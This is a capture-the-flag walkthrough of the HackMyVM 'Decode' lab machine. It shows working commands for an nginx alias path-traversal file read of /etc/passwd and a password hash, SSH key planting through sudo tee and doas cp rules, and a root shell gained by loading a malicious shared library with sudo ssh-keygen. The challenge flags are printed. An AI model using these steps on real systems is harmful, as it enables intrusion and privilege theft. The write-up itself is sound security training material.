# Decode

## Recon

```bash
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.3
10.0.2.149 # Me
10.0.2.193 # Target
```

::: details nmap_scan.log.md
```log
Open 10.0.2.193:22
Open 10.0.2.193:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.193
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E=
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc=
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp open  http    syn-ack nginx 1.18.0
| http-robots.txt: 1 disallowed entry 
|_/encode/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/decode/writeup.png)

```bash
└─$ curl http://10.0.2.193/robots.txt
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh
```

### Nginx Off By Slash

Nginx configurations have common misconfiguration where `alias` block doesn't have `/` at the end and this leads to LFI, testing for it reveals vulnerability
```bash
└─$ curl http://10.0.2.193/decode../etc/passwd -so- | grep sh$
root:x:0:0:root:/root:/bin/bash
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
ajneya:x:1003:1003::/home/ajneya:/bin/bash
```

Start cracking in background
```bash
PS > john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt --format=crypt
```

Something in history files
```bash
└─$ curl http://10.0.2.193/decode../home/steve/.bash_history -so-
nothingHere :(

└─$ curl http://10.0.2.193/decode../usr/share/.bash_history -so-
rm -rf /usr/share/ssl-cert/decode.csr

└─$ curl http://10.0.2.193/decode../usr/share/ssl-cert/decode.csr -so-
-----BEGIN CERTIFICATE REQUEST-----
MIIDAzCCAesCAQAwSDERMA8GA1UEAwwISGFja015Vk0xDzANBgNVBAgMBmRlY29k
ZTEPMA0GA1UEBwwGZGVjb2RlMREwDwYDVQQKDAhIYWNrTXlWTTCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBANnSG9vEEGPRgDA/cT6NT3sMKsi6dLhKwRgy
PcRpRt1TO63kpY2PxNSgOPpydjUm34nwghy5lPL4+GBXoNOHMhQI1hUVqZXmuFB8
+DCETqXNfV5JnTRMG5tr2m4vV1HNTH+/GUueBm5R/ERu69n2xMADs4nEL3iRjOO/
19sYZIj+ZDaN3MouyqrprWy9PBwKf2VTy4prJh6nTEVSV8oRRtd+nOxfEG6890+P
lF6s0XDpv8V001aiJWSceYPIikvKXaVy45h3JoYzWsQzt3b1R22DuPjAOQ3AvZbp
V68lkF+S1rIa7gsb8oeZI16yPz+GEPVvXGzLyIYhDixdxOCFZaECAwEAAaB2MBkG
CSqGSIb3DQEJBzEMDAppNG1EM2MwZDNyMFkGCSqGSIb3DQEJDjFMMEowDgYDVR0P
AQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAWBgNV
HREEDzANggtoYWNrbXl2bS5ldTANBgkqhkiG9w0BAQsFAAOCAQEAO73W3pTMqSm2
A37vepuR4F3ycnFKdFyRhk1rtO1LE9OWOI3bQ7kW0wIFuRaqFONsG/mvGFgEfRR8
xpgSYmnzWJQ0nTOtGi6d7F0dFFmYIXe75+6QYM2ZwAYf3lW+HRKLXhh5FMeoXJHo
eU64o9tFdhWxcB1OLAGEG9MI6AhN62ZTrKwMq13/PIteoPAEnlVgBidxQxUVHQfO
EwMP38jzm+HESbZsNVjX4RQjtvBUAKQUTBRYuS02QqqC5ajHz0RWaGgrGIyKrip5
yRjgsjxtmadaetxSasIg5tsjSFGyyVVPsdY4umAUUm+dSobruxcyXuxXIgn27Z7M
h97It2ELpw==
-----END CERTIFICATE REQUEST-----
```

```bash
└─$ curl http://10.0.2.193/decode../usr/share/ssl-cert/decode.csr -so- | openssl req -text -noout | grep -v '..:..:'
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: CN=HackMyVM, ST=decode, L=decode, O=HackMyVM
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    65:a1
                Exponent: 65537 (0x10001)
        Attributes:
            challengePassword        :i4mD3c0d3r
            Requested Extensions:
                X509v3 Key Usage: critical
                    Digital Signature, Key Encipherment
                X509v3 Extended Key Usage: critical
                    TLS Web Server Authentication, TLS Web Client Authentication
                X509v3 Subject Alternative Name:
                    DNS:hackmyvm.eu
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
```

## SSH

```bash
└─$ sshpass -p 'i4mD3c0d3r' ssh steve@10.0.2.193 -t bash
steve@decode:~$ id
uid=1001(steve) gid=1001(steve) groups=1001(steve)
```

## Lateral Movement

```bash
steve@decode:~$ sudo -l
Matching Defaults entries for steve on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steve may run the following commands on decode:
    (decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee
```

```bash
└─$ gen_ssh_deploy id_rsa decoder
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p decoder/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMSlA/oEZ643+yyt+aFxqViBx/+MfZY02ECsFLCzNx7c woyag@kraken' >> decoder/.ssh/authorized_keys ; chmod 700 decoder/.ssh ; chmod 600 decoder/.ssh/authorized_keys
```

Most likely SSH directory doesn't exist and write fails
```bash
steve@decode:/home/steve$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMSlA/oEZ643+yyt+aFxqViBx/+MfZY02ECsFLCzNx7c woyag@kraken' | sudo -u decoder tee -a /home/decoder/.ssh/authorized_keys
tee: /home/decoder/.ssh/authorized_keys: No such file or directory
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMSlA/oEZ643+yyt+aFxqViBx/+MfZY02ECsFLCzNx7c woyag@kraken
```

`openssl enc` is most likely useless for now

```bash
steve@decode:/home/steve$ find / -perm -4000 -ls 2>/dev/null
      109     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
    15774    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo
      110     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
       51     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
      107     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
      766     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
      106     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
     3596     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
     1592     40 -rwsr-xr-x   1 root     root        39008 Feb  4  2021 /usr/bin/doas # <---
       50     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
   268059    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
   137330     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

`doas` is unusual
```bash
steve@decode:/home/steve$ cat /etc/doas.conf
permit nopass steve as ajneya cmd cp
```

```bash
steve@decode:/home/steve$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMSlA/oEZ643+yyt+aFxqViBx/+MfZY02ECsFLCzNx7c woyag@kraken' > /tmp/auth
steve@decode:/home/steve$ doas -u ajneya cp /tmp/auth /home/ajneya/.ssh/authorized_keys
cp: cannot create regular file '/home/ajneya/.ssh/authorized_keys': No such file or directory
steve@decode:/home/steve$ mkdir /tmp/.ssh
steve@decode:/home/steve$ mv /tmp/auth /tmp/.ssh/authorized_keys
steve@decode:/home/steve$ doas -u ajneya cp /tmp/.ssh/ /home/ajneya/ -r
```

```bash
└─$ ssh -i id_rsa ajneya@10.0.2.193
ajneya@decode:~$ id
uid=1003(ajneya) gid=1003(ajneya) groups=1003(ajneya)
```

### User.txt

```bash
ajneya@decode:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

## Privilege Escalation

```bash
ajneya@decode:~$ sudo -l
Matching Defaults entries for ajneya on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ajneya may run the following commands on decode:
    (root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*
```

- [https://gtfobins.org/gtfobins/ssh-keygen/](https://gtfobins.org/gtfobins/ssh-keygen/)

To get code execution we first need to write to `/opt`
```bash
ajneya@decode:~$ ls -alh /opt/
total 12K
drwxr-xr-x  3 root    root    4.0K Apr 14  2022 .
drwxr-xr-x 18 root    root    4.0K Apr 14  2022 ..
drwx------  2 decoder decoder 4.0K Apr 14  2022 decode
```

Only root and `decoder` can do that

We can go back to `steve` and use their `sudo` privileges to write as `decoder`
```bash
└─$ echo $'#include <unistd.h>\nint __attribute__((constructor)) init() { execl("/bin/bash", "bash", 0); return 0; }' | gcc -w -fPIC -shared -o lib.so -x c -
└─$ scp -i id_rsa lib.so ajneya@10.0.2.193:/tmp
---
steve@decode:~$ cat /tmp/lib.so | sudo -u decoder tee /opt/decode/lib.so >/dev/null
---
ajneya@decode:~$ sudo ssh-keygen -D /opt/decode/lib.so
root@decode:/home/ajneya# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@decode:/home/ajneya# cat /root/root.txt
63a9f0ea7bb98050796b649e85481845
```